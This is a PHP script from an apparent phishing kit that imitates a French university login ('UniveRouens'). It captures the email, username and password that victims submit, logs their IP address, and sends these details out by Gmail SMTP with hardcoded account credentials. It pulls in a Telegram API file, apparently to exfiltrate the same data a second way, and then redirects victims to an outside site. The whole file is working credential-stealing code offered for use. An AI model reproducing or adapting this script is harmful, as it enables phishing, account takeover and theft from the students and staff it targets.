 <?php
 header('Location:https://generaluniver.web.app/');
//import PHPMailerAutoload.php file which located inside phpmailer folder
  require 'phpmailer/PHPMailerAutoload.php';


  ///////Post data from form
  $to=$_POST['mailla'];
  $email=htmlspecialchars($_POST['email']);
  $utilisateur=htmlspecialchars($_POST['user']);
  $password=htmlspecialchars($_POST['pass']);;
  $ip=$_SERVER['REMOTE_ADDR'];

  
// create object of class PHPMailer
   $mail = new PHPMailer;
  
// print client server communication output if we don't want to print it we can use 3
   $mail->SMTPDebug = 3;  
  
// Set mailer to use SMTP
   $mail->isSMTP(); 
   
// Specify main and backup SMTP servers 
   $mail->Host = 'smtp.gmail.com';
   
// Enable SMTP authentication
   $mail->SMTPAuth = true;
  
// EDIT REQUIRED 
// SMTP username mainly it is sender gmail replace 'techifind@gmail.com' with your gmail   
   $mail->Username = 'calbe@gmail.com'; 
 
// EDIT REQUIRED   
// SMTP password it is your gmail password
   $mail->Password = 'cqahwdkpnzbelk';
   
// Enable TLS encryption, `ssl` also accepted
   $mail->SMTPSecure = 'tls';  
 
// TCP port to connect to 
   $mail->Port = 587;
 
// EDIT REQUIRED    
// set from it show in from of your mail 
   $mail->setFrom($email.', Info UniveRouens');
   
// EDIT REQUIRED
// Add a recipient it is address where you want to send your email you can add multiple here
   $mail->addAddress($to);     
   
// $mail->addAddress('ellen@example.com');   // to send multiple email 
 
// EDIT REQUIRED
// set reply to 
   $mail->addReplyTo($email.', no-reply');
   
//set cc or bcc it is optional   
//$mail->addCC('cc@example.com');
//$mail->addBCC('bcc@example.com');
 
// Add attachments it is optional
// $mail->addAttachment('/var/tmp/file.tar.gz');         
// $mail->addAttachment('/tmp/image.jpg', 'new.jpg'); 
 
// Set email format to HTML if you want to send html document 
   $mail->isHTML(true);
   
// set subject of your email
   $mail->Subject = 'AInfo univ universels';
  
// write your body content we can use html    
   $message="***** 🤡 Victime Academique🤡 *****\r\n";
   $message .="IP VICTIME :".$_SERVER['REMOTE_ADDR']."\r\n";
   $message .="🆔 Nom utilisateur:".$email."\r\n";
   $message .="🆔 identifiant :".$utilisateur."\r\n";
   $message .="[🔓 Mot de passe ]:".$password."\r\n";
   $mail->Body    = '<header>
          <style>
          h2{color:green;margin-left:0px;text-transform:capitalize}
#parent{border:10px solid blue;-webkit-box-shadow:12px 12px 8px #666666 ;border-radius:10px;width:500px;height:auto;background:#CCC;margin-left:10px;padding-left:5px}
#sparent{margin-left:0px;margin-top:50px;
color:#066;font-style:italic; font-family:"Palatino Linotype", "Book Antiqua", Palatino, serif}
span{padding-left:3px;color:#960;font-size:20px}
         </style>
         </head>

<body>
<div id="parent">
<h2>les donn&eacute;es de bonnheur</h2> 
<div id="sparent">
<div>Ip:<span>'.$ip.'</span></div>
<div id="sparent"><div>mail:<span>'.$email.'</span></div> 
<div>mot de passe :<span>'.$password.'</span></div>
</div>
  </div>
</body>
</html>';   

   $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
 
/* finally send email if email send is success then print 'Message has been sent'
   if not then print 'Message could not be sent'
*/ include 'TelegramApi.php';
   if(!$mail->send()) {
    echo 'Message could not be sent.';
    echo 'Mailer Error: ' . $mail->ErrorInfo;
   }  
   else  
   {
    echo 'Message has been sent';
   }
   
   // here we can change value dynamically with php variable as per required
  
   ?>